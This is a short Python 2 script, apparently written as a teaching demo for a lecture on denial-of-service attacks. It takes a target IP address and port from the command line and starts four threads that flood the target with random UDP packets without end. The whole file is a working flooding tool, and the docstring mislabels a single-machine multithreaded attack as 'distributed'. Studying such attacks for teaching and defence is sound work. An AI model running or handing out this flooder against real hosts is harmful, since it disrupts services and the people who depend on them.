'''
Program as a proof of concept for the ISSS Lecture on Denial of service atttacks

This program takes 2 command line arguments. The first is an ip-address and the second is a port. 
It then runs 4 threads that send large amount of bits to the desired server with the desired port. 
Because it runs on multiple threads, this program is considered a Distributed Denial of Service

This program is not intended to be used maliciously, rather to demonstrate how easy it is to create a denial of service attack
'''

import socket
import random
import sys
from threading import Thread

# 1,000 bits
N_BITS = 1000

# Set up socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Method to send the data with given ip address and port
def send_data (thread_name, ip_address, port):
	print "Starting " + thread_name
	# Run for fucking ever
	while (True):
		# Create random data and send it
		bits = random.getrandbits(N_BITS)
		sock.sendto(str(bits), (ip_address, int(port)))


print "IP address is " + str(sys.argv[1])
print "port is " + str(sys.argv[2])

# Get desired ip address and port
IP = str(sys.argv[1])
PORT = sys.argv[2]

# Create 4 threads to send data
try:
	t1 = Thread(target=send_data, args=("Thread-1", IP, PORT))
	t2 = Thread(target=send_data, args=("Thread-2", IP, PORT))
	t3 = Thread(target=send_data, args=("Thread-3", IP, PORT))
	t4 = Thread(target=send_data, args=("Thread-4", IP, PORT))

	t1.start()
	t2.start()
	t3.start()
	t4.start()
except:
	print "Could not start threads"
